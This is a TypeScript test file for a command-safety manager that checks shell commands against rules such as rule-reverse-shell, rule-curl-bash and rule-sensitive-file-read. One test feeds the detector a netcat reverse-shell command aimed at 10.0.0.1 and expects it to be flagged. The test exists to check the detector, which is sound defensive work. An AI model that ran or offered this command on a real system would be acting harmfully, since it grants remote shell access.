import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { getSecurityManager, setTestMode, SecurityProtocolManager } from './manager.js';
import { getDefaultRules } from './default-rules.js';
import type { SecurityDatabase, SecurityConfig } from './types.js';

describe('SecurityProtocolManager', () => {
  let tempDir = '';

  beforeEach(() => {
    setTestMode(true);
  });

  afterEach(() => {
    setTestMode(false);
    if (tempDir) {
      rmSync(tempDir, { recursive: true, force: true });
    }
    tempDir = '';
  });

  it('resetToDefaults should clear enabled/disabled overrides and restore builtin rules', () => {
    const manager = getSecurityManager();

    expect(manager.getEnabledRules().some((rule) => rule.id === 'rule-sudo')).toBe(true);

    manager.disableRule('rule-sudo');
    expect(manager.getEnabledRules().some((rule) => rule.id === 'rule-sudo')).toBe(false);

    manager.resetToDefaults();

    expect(manager.getEnabledRules().some((rule) => rule.id === 'rule-sudo')).toBe(true);
    expect(manager.getConfig().rules.enabled).toEqual([]);
    expect(manager.getConfig().rules.disabled).toEqual([]);
  });

  it('throws when persisted security config is malformed', () => {
    setTestMode(false);
    tempDir = mkdtempSync(join(tmpdir(), 'vectahub-security-config-'));
    const configPath = join(tempDir, 'security-config.json');
    writeFileSync(configPath, '{bad json', 'utf-8');

    expect(() => new SecurityProtocolManager(configPath)).toThrow(`Failed to load security config from ${configPath}`);
  });

  it('throws when persisted security database is malformed', () => {
    setTestMode(false);
    tempDir = mkdtempSync(join(tmpdir(), 'vectahub-security-db-'));
    const configPath = join(tempDir, 'security-config.json');
    const dbPath = join(tempDir, 'security-database.json');
    writeFileSync(configPath, JSON.stringify({
      databasePath: dbPath,
      autoUpdate: true,
      rules: { enabled: [], disabled: [] },
    }), 'utf-8');
    writeFileSync(dbPath, '{bad json', 'utf-8');

    expect(() => new SecurityProtocolManager(configPath)).toThrow(`Failed to load security database from ${dbPath}`);
  });

  it('throws when initializing security config path is not writable as a file target', () => {
    setTestMode(false);
    tempDir = mkdtempSync(join(tmpdir(), 'vectahub-security-save-'));
    const blockedDir = join(tempDir, 'blocked-parent');
    mkdirSync(blockedDir, { recursive: true });
    const blockingFile = join(blockedDir, 'not-a-directory');
    writeFileSync(blockingFile, 'blocked', 'utf-8');
    const configPath = join(blockingFile, 'security-config.json');

    expect(() => new SecurityProtocolManager(configPath)).toThrow(`Failed to initialize security config at ${configPath}`);
  });

  describe('default rule migration', () => {
    function createStaleDatabase(tempDir: string, ruleIds: string[]): { configPath: string; dbPath: string } {
      const configPath = join(tempDir, 'security-config.json');
      const dbPath = join(tempDir, 'security-database.json');

      const config: SecurityConfig = {
        databasePath: dbPath,
        autoUpdate: true,
        rules: { enabled: [], disabled: [] }
      };
      writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf-8');

      const staleRules = ruleIds.map(id => ({
        id,
        name: `Rule ${id}`,
        description: '',
        category: 'system' as const,
        severity: 'medium' as const,
        patterns: ['^test'],
        enabled: true,
        createdAt: '2026-01-01T00:00:00.000Z',
        updatedAt: '2026-01-01T00:00:00.000Z',
        source: 'builtin' as const
      }));

      const db: SecurityDatabase = {
        version: '1.0.0',
        lastUpdated: '2026-01-01T00:00:00.000Z',
        rules: staleRules
      };
      writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf-8');

      return { configPath, dbPath };
    }

    it('should merge missing default rules into existing database', () => {
      setTestMode(false);
      tempDir = mkdtempSync(join(tmpdir(), 'vectahub-security-migrate-'));
      const { configPath, dbPath } = createStaleDatabase(tempDir, ['rule-sudo', 'rule-rm-root']);

      const manager = new SecurityProtocolManager(configPath);
      const ruleIds = manager.getAllRules().map(r => r.id);

      expect(ruleIds).toContain('rule-sudo');
      expect(ruleIds).toContain('rule-rm-root');
      expect(ruleIds).toContain('rule-reverse-shell');
      expect(ruleIds).toContain('rule-curl-bash');
      expect(ruleIds).toContain('rule-sensitive-file-read');
      expect(ruleIds.length).toBeGreaterThanOrEqual(17);
    });

    it('should not overwrite existing user-customized rules', () => {
      setTestMode(false);
      tempDir = mkdtempSync(join(tmpdir(), 'vectahub-security-migrate-custom-'));
      const { configPath } = createStaleDatabase(tempDir, ['rule-sudo']);

      const manager = new SecurityProtocolManager(configPath);
      manager.updateRule('rule-sudo', { severity: 'low', description: 'user customized' });

      const manager2 = new SecurityProtocolManager(configPath);
      const sudoRule = manager2.getRuleById('rule-sudo');

      expect(sudoRule?.severity).toBe('low');
      expect(sudoRule?.description).toBe('user customized');
    });

    it('should detect reverse shell after migration', () => {
      setTestMode(false);
      tempDir = mkdtempSync(join(tmpdir(), 'vectahub-security-migrate-detect-'));
      const { configPath } = createStaleDatabase(tempDir, ['rule-sudo']);

      const manager = new SecurityProtocolManager(configPath);
      const result = manager.detectCommand('nc -e /bin/sh 10.0.0.1 4444');

      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-reverse-shell');
      expect(result.severity).toBe('high');
    });

    it('should persist merged rules to disk', () => {
      setTestMode(false);
      tempDir = mkdtempSync(join(tmpdir(), 'vectahub-security-migrate-persist-'));
      const { configPath, dbPath } = createStaleDatabase(tempDir, ['rule-sudo']);

      new SecurityProtocolManager(configPath);

      const persisted = JSON.parse(readFileSync(dbPath, 'utf-8')) as SecurityDatabase;
      const persistedIds = persisted.rules.map(r => r.id);

      expect(persistedIds).toContain('rule-reverse-shell');
      expect(persistedIds).toContain('rule-sudo');
    });

    it('should not add duplicate rules when database is already up to date', () => {
      setTestMode(false);
      tempDir = mkdtempSync(join(tmpdir(), 'vectahub-security-migrate-nodup-'));
      const configPath = join(tempDir, 'security-config.json');
      const dbPath = join(tempDir, 'security-database.json');

      const config: SecurityConfig = {
        databasePath: dbPath,
        autoUpdate: true,
        rules: { enabled: [], disabled: [] }
      };
      writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf-8');

      const db: SecurityDatabase = {
        version: '1.0.0',
        lastUpdated: new Date().toISOString(),
        rules: getDefaultRules()
      };
      writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf-8');

      new SecurityProtocolManager(configPath);

      const persisted = JSON.parse(readFileSync(dbPath, 'utf-8')) as SecurityDatabase;
      const reverseCount = persisted.rules.filter(r => r.id === 'rule-reverse-shell').length;
      expect(reverseCount).toBe(1);
    });
  });
});
